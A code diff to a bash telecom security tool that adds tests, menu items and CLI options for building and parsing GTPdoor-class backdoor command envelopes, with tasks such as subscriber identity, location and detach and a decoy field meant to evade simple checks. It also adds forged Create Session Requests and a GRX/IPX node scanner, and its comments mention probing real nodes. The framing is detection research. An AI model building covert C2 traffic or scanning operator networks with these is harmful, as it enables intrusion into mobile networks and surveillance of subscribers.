+        "$(lcore_cmd_gtpdoor 40020009000000000300020002 2>/dev/null | grep -c 'vendor quirk')" "1"
+    # and the thing it exists to catch must still be caught
+    # A forged CSR whose length field disagrees with its own byte count is not a
+    # valid CSR -- and a node answers it with Cause 67 (Invalid length), which
+    # reads exactly like a policy reply. Measured on 213.163.100.100: declared 41
+    # against a real 40 got 6/6 Create Session Responses carrying Cause 67, while
+    # the same IEs with a correct length got 0/6. The forge output must be able to
+    # say length_agrees yes or the test result is about our builder, not the node.
+    chk csr-forge-length-consistent \
+        "$(lcore_cmd_gtp_csr_forge 286011234567890 internet 220 01 2>/dev/null \
+           | awk -F'\t' '$1=="message"{print $2}' \
+           | while read -r h; do python3 -c "
+import sys
+b=bytes.fromhex('$h')
+print('yes' if int.from_bytes(b[2:4],'big')==len(b)-4 else 'no')
+"; done)" "yes"
+    chk gtpdoor-covert-still-high \
+        "$(lcore_cmd_gtpdoor 4001001D000001000100080082061132547698F00300010000FF00040000000100 2>/dev/null | awk -F'\t' '$1=="findings"{print $2}')" "1"
 
     out=$(lcore_cli_status_tsv)
     chk status-tag    "$(fld "$out" tag)" "lcore"
@@ -4154,6 +4666,101 @@ lcore_selftest() {
     chk cidr-out "$(lcore_cidr_contains 10.0.0.0/8 11.1.2.3 >/dev/null; echo $?)" "1"
     chk cidr-host "$(lcore_cidr_contains 10.0.0.7/32 10.0.0.7 >/dev/null; echo $?)" "0"
     chk gtp-screen-usage "$(lcore_cmd_gtp_screen_peer "" >/dev/null 2>&1; echo $?)" "2"
+
+    # ── 13b. the GTPdoor channel, read back and caught ──────────────────
+    # The detector could name this class and had nothing that produced it.
+    # These rows are the sample: built here, parsed here, and handed to
+    # --gtpdoor-detect as an octet string, not as a claim.
+    local bd bdh prs
+    bd=$(lcore_cmd_gtpdoor_build 310150123456789 identity)
+    chk gtpdoor-build-type  "$(fld "$bd" message_type)" "1"
+    chk gtpdoor-build-name  "$(fld "$bd" message)" "Echo Request"
+    chk gtpdoor-build-dir   "$(fld "$bd" direction)" "request"
+    chk gtpdoor-build-imsi  "$(fld "$bd" imsi)" "310150123456789"
+    chk gtpdoor-build-task  "$(fld "$bd" task)" "identity"
+    chk gtpdoor-build-tid   "$(fld "$bd" task_id)" "1"
+    chk gtpdoor-build-pext  "$(fld "$bd" private_extension)" "00000100"
+    # A request carries no Recovery IE by default: measured against 433 live
+    # GTP-C nodes, a request with one got 0/8 replies and without it 8/8.
+    chk gtpdoor-build-octets "$(fld "$bd" octets)" "28"
+    bdh=$(fld "$bd" hex)
+    chk gtpdoor-build-no-decoy "$(printf '%s' "$bdh" | grep -c '03000100')" "0"
+    chk gtpdoor-build-decoy-opt "$(lcore_cmd_gtpdoor_build 310150123456789 identity --decoy | awk -F'\t' '$1=="octets"{print $2}')" "33"
+    chk gtpdoor-build-decoy-honoured \
+        "$(lcore_cmd_gtpdoor_build 310150123456789 identity --decoy | awk -F'\t' '$1=="hex"{print}' | grep -c '03000100')" "1"
+    chk gtpdoor-detect-catches "$(lcore_cmd_gtpdoor "$bdh" | awk -F'\t' '$1=="findings"{print ($2>0)?"y":"n"}')" "y"
+    prs=$(lcore_cmd_gtpdoor_parse "$bdh")
+    chk gtpdoor-rt-task     "$(fld "$prs" task)" "identity"
+    chk gtpdoor-rt-imsi     "$(fld "$prs" imsi)" "310150123456789"
+    chk gtpdoor-rt-recovery "$(fld "$prs" recovery)" "-"
+    chk gtpdoor-rt-pext     "$(fld "$prs" private_extension)" "00000100"
+    chk gtpdoor-rt-dir      "$(fld "$prs" direction)" "request"
+
+    bd=$(lcore_cmd_gtpdoor_build 310150123456789 sleep)
+    chk gtpdoor-sleep-default "$(fld "$bd" param)" "0060"
+    chk gtpdoor-sleep-len     "$(fld "$bd" param_len)" "2"
+    bd=$(lcore_cmd_gtpdoor_build 310150123456789 raw deadbeef)
+    chk gtpdoor-raw-param   "$(fld "$bd" param)" "DEADBEEF"
+    chk gtpdoor-raw-len     "$(fld "$bd" param_len)" "4"
+    bd=$(lcore_cmd_gtpdoor_build 310150123456789 location --response 41424344)
+    chk gtpdoor-resp-type   "$(fld "$bd" message_type)" "2"
+    chk gtpdoor-resp-dir    "$(fld "$bd" direction)" "response"
+    chk gtpdoor-resp-imsi   "$(fld "$bd" imsi)" "-"
+    prs=$(lcore_cmd_gtpdoor_parse "$(fld "$bd" hex)")
+    chk gtpdoor-resp-rt     "$(fld "$prs" param)" "41424344"
+    chk gtpdoor-resp-rt-task "$(fld "$prs" task)" "location"
+
+    chk gtpdoor-badtask     "$(lcore_cmd_gtpdoor_build 310150123456789 bogus >/dev/null 2>&1; echo $?)" "2"
+    chk gtpdoor-badimsi     "$(lcore_cmd_gtpdoor_build 123 identity >/dev/null 2>&1; echo $?)" "2"
+    chk gtpdoor-param-extra "$(lcore_cmd_gtpdoor_build 310150123456789 identity 00 >/dev/null 2>&1; echo $?)" "2"
+    chk gtpdoor-raw-missing "$(lcore_cmd_gtpdoor_build 310150123456789 raw >/dev/null 2>&1; echo $?)" "2"
+    chk gtpdoor-sleep-short "$(lcore_cmd_gtpdoor_build 310150123456789 sleep 00 >/dev/null 2>&1; echo $?)" "2"
+    chk gtpdoor-parse-noext "$(lcore_cmd_gtpdoor_parse 4001000400000100 | awk -F'\t' '$1=="task"{print $2}')" "-"
+    chk gtpdoor-parse-usage "$(lcore_cmd_gtpdoor_parse "" >/dev/null 2>&1; echo $?)" "2"
+    chk gtpdoor-parse-badhex "$(lcore_cmd_gtpdoor_parse zz >/dev/null 2>&1; echo $?)" "2"
+
+    # ── 13c. reachability verdicts, and the inventory over them ─────────
+    chk grx-verdict-echo   "$(lcore_grx_verdict gtp-echo)" "echo-reply"
+    chk grx-verdict-diam   "$(lcore_grx_verdict diameter-reply)" "echo-reply"
+    chk grx-verdict-sctp   "$(lcore_grx_verdict sctp-assoc)" "echo-reply"
+    chk grx-verdict-other  "$(lcore_grx_verdict gtp-other)" "error-unknown"
+    chk grx-verdict-mute   "$(lcore_grx_verdict tcp-open-no-answer)" "error-unknown"
+    chk grx-verdict-silent "$(lcore_grx_verdict timeout)" "unobserved"
+    chk grx-verdict-icmp   "$(lcore_grx_verdict unreachable)" "unobserved"
+    chk grx-verdict-unsup  "$(lcore_grx_verdict unsupported)" "unobserved"
+    chk grx-verdict-garbage "$(lcore_grx_verdict nonsense)" "unobserved"
+    chk grx-node-gtpc      "$(lcore_grx_node_class gtpc gtp-echo)" "gtp-c-node"
+    chk grx-node-gtpu      "$(lcore_grx_node_class gtpu gtp-echo)" "gtp-u-node"
+    chk grx-node-diam      "$(lcore_grx_node_class diameter diameter-reply)" "diameter-peer"
+    chk grx-node-sctp      "$(lcore_grx_node_class sctp sctp-assoc)" "sctp-listener"
+    chk grx-node-silent    "$(lcore_grx_node_class gtpc timeout)" "unknown"
+
+    chk grx-targets-host   "$(lcore_grx_targets 127.0.0.7 | wc -l | tr -d ' ')" "1"
+    chk grx-targets-first  "$(lcore_grx_targets 127.0.0.7 | head -1)" "127.0.0.7"
+    chk grx-targets-30     "$(lcore_grx_targets 127.0.0.0/30 | wc -l | tr -d ' ')" "4"
+    chk grx-targets-30-last "$(lcore_grx_targets 127.0.0.0/30 | tail -1)" "127.0.0.3"
+    chk grx-targets-cap    "$(lcore_grx_targets 127.0.0.0/24 5 | wc -l | tr -d ' ')" "5"
+    chk grx-targets-bad    "$(lcore_grx_targets 999.1.1.1 >/dev/null 2>&1; echo $?)" "2"
+    chk grx-targets-badpfx "$(lcore_grx_targets 10.0.0.0/33 >/dev/null 2>&1; echo $?)" "2"
+    chk grx-targets-empty  "$(lcore_grx_targets "" >/dev/null 2>&1; echo $?)" "2"
+    printf '198.51.100.0/31\n\n# a comment\n203.0.113.9\n' > "$d/targets.txt"
+    chk grx-targets-file   "$(lcore_grx_targets "$d/targets.txt" | wc -l | tr -d ' ')" "3"
+    chk grx-scan-badproto  "$(lcore_cmd_grx_scan 127.0.0.1 --proto bgp >/dev/null 2>&1; echo $?)" "2"
+    chk grx-scan-nospec    "$(lcore_cmd_grx_scan >/dev/null 2>&1; echo $?)" "2"
+
+    printf 'addr\tport\tproto\tverdict\trtt_ms\tnode_class\tplmn\trole\tdetail\n' > "$d/reach.tsv"
+    printf '203.0.113.5\t2123\tgtpc\techo-reply\t1.2\tgtp-c-node\t310-260\tgrx-peer\techo-response\n' >> "$d/reach.tsv"
+    printf '198.51.100.9\t2123\tgtpc\techo-reply\t1.5\tgtp-c-node\t-\t-\techo-response\n' >> "$d/reach.tsv"
+    printf '198.51.100.10\t2123\tgtpc\tunobserved\t-\tunknown\t-\t-\tno-reply\n' >> "$d/reach.tsv"
+    local im
+    im=$(lcore_cmd_ipx_map "$d/reach.tsv")
+    chk ipx-uncontracted "$(fld "$im" uncontracted_answering)" "1"
+    chk ipx-addresses    "$(fld "$im" addresses)" "3"
+    chk ipx-plmns        "$(fld "$im" plmns)" "2"
+    chk ipx-contracted   "$(printf '%s\n' "$im" | awk -F'\t' '$1=="310-260"{print $9}')" "contracted-answering"
+    chk ipx-stranger     "$(printf '%s\n' "$im" | awk -F'\t' '$1=="-"{print $9}')" "uncontracted-answering"
+    chk ipx-missing      "$(lcore_cmd_ipx_map "$d/nope.tsv" >/dev/null 2>&1; echo $?)" "1"
+    chk ipx-usage        "$(lcore_cmd_ipx_map >/dev/null 2>&1; echo $?)" "2"
 
     # Diameter screening: the same message on the wrong interface. ULR (316)
     # on S6a from a peer is the identity-theft shape; a UAR (300) on Cx from an
@@ -4410,6 +5017,9 @@ lcore_menu() {
   [11] status
   [12] build a GTP-in-GTP encapsulation (GTPv1-U outer, GTPv1-U inner)
   [13] build an MBMS Session Start Request (GTPv2-C 231) / MooD variant
+  [14] build / read a GTPdoor-class C2 envelope
+  [15] scan a GRX/IPX prefix for answering GTP diameter or SCTP nodes
+  [16] join a reachability file to the interconnect peer rule
   [0]  back
 
 M
@@ -4452,6 +5062,19 @@ M
                          m|M) lcore_cmd_mbms_session --mood | column -t -s$'\t' 2>/dev/null || lcore_cmd_mbms_session --mood ;;
                          *)   lcore_cmd_mbms_session | column -t -s$'\t' 2>/dev/null || lcore_cmd_mbms_session ;;
                      esac
+                     read -rp "  press enter " _; fi ;;
+            14) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI and a task; cannot prompt in CLI mode" >&2
+                else read -rp "  IMSI> " i
+                     read -rp "  task [identity/location/bearers/detach/sleep/raw]> " t
+                     lcore_cmd_gtpdoor_build "$i" "$t" | column -t -s$'\t' 2>/dev/null || lcore_cmd_gtpdoor_build "$i" "$t"
+                     read -rp "  press enter " _; fi ;;
+            15) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need a prefix or a file; cannot prompt in CLI mode" >&2
+                else read -rp "  prefix or target file> " pfx
+                     lcore_cmd_grx_scan "$pfx" | column -t -s$'\t' 2>/dev/null || lcore_cmd_grx_scan "$pfx"
+                     read -rp "  press enter " _; fi ;;
+            16) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need a file; cannot prompt in CLI mode" >&2
+                else read -rp "  reachability tsv> " rf
+                     lcore_cmd_ipx_map "$rf" | column -t -s$'\t' 2>/dev/null || lcore_cmd_ipx_map "$rf"
                      read -rp "  press enter " _; fi ;;
             0) return ;;
             *) warn "invalid"; sleep 1 ;;
@@ -4645,6 +5268,10 @@ lcore_cli_main() {
         --flood-model)   lcore_flood_model "${1:-2000}" "${2:-500}" "${3:-100}" ;;
         --diameter-send) lcore_cmd_diameter_send "$@" ;;
         --gtpdoor-detect) lcore_cmd_gtpdoor "${1:-}" ;;
+        --gtpdoor-build) lcore_cmd_gtpdoor_build "$@" ;;
+        --gtpdoor-parse) lcore_cmd_gtpdoor_parse "${1:-}" ;;
+        --grx-scan)      lcore_cmd_grx_scan "$@" ;;
+        --ipx-map)       lcore_cmd_ipx_map "${1:-}" ;;
         --cdr-fraud-check) lcore_cmd_cdr_fraud "${1:-}" ;;
         --fs20-audit)    lcore_cmd_fs20 "${1:-}" ;;
         --gtp-screen-peer) lcore_cmd_gtp_screen_peer "${1:-}" "${2:-}" ;;
@@ -4694,6 +5321,20 @@ Usage: $0 COMMAND
                               send a Diameter message over TCP 3868, or TLS
                               with LTE_DIAMETER_TLS=1
   --gtpdoor-detect <hex>      GTPdoor-class Echo abuse detection
+  --gtpdoor-build <imsi> <task> [param] [--response [result-hex]]
+                              the channel GTPdoor rides: an Echo whose Private
+                              Extension carries a task, with a decoy Recovery
+                              IE so the cheapest check passes; tasks are
+                              identity, location, bearers, detach, sleep, raw
+  --gtpdoor-parse <hex>       read that envelope back, both directions
+  --grx-scan <cidr|file> [--proto gtpc|gtpu|diameter|sctp]
+               [--port N] [--timeout SEC] [--limit N] [--out path]
+                              one probe per address across a prefix, answered
+                              as echo-reply, error-unknown or unobserved;
+                              silence is a verdict, never a closed port
+  --ipx-map <reachability.tsv>
+                              the scan's rows joined to the peer rule: which
+                              PLMN answered, and which answered uninvited
   --cdr-fraud-check <tsv>     CDR overbilling/bypass anomaly
   --fs20-audit <config>       GSMA FS.20 GTP interconnect controls
   --gtp-screen-peer <ip> [message-type]
